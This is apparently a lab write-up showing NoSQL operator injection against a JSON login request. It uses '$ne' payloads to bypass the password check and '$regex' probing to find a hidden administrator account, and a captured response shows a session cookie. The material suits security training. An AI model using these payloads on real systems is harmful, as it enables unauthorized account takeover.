# Exploiting NoSQL operator injection to bypass authentication
First, I wanted to figure out if I could use operators to login to a user. So I modified my login request like this:
```json
{
    "username": "wiener",
    "password": "peter"
}
```
to 
```json
{
    "username": "wiener",
    "password": {
        "$ne" : "asdasdasd"
    }
}
```
It allowed me to login. I then tried as administrator like this
```json
{
    "username": "administrator",
    "password": {
        "$ne" : "asdasdasd"
    }
}
```
But no user named administrator was present. I then tried to return all users
```json
{
    "username": {
        "$ne" : "asdasdasd"
    },
    "password": {
        "$ne" : "asdasdasd"
    }
}
```
But it complained that it returned too many users. Then I decided to user regex to find the user.
```json
{
    "username": {
        "$regex" : "a"
    },
    "password": {
        "$ne" : "asdasdasd"
    }
}
```
This returned no users. I then tried every letter until `d` where the server responded with
```
HTTP/2 302 Found
Location: /my-account?id=adminjzst3rvm
Set-Cookie: session=K95dbnsTb9pF14C48EuPai7YTppABGPz; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```
Then I logged into the account by intercepting my login request and changed it to
```json
{
    "username": "adminjzst3rvm",
    "password": {
        "$ne" : "asdasdasd"
    }
}
```
This solved the lab